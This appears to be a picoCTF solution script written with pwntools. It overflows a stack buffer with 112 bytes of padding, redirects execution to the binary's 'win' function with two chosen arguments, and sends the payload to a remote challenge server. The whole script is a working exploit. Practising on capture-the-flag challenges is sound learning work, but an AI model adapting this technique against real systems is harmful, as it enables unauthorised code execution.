#!/usr/bin/python3

from pwn import *

elf = ELF('vuln')

#io = process('./vuln')

io = remote('saturn.picoctf.net' ,49426)

ret  = 0x08049009
arg1 = 0xCAFEF00D
arg2 = 0xF00DF00D

payload = cyclic(112) + pack(ret) + pack(elf.sym.win) + pack(ret) + pack(arg1) + pack(arg2) 

io.sendline(payload)
io.interactive()
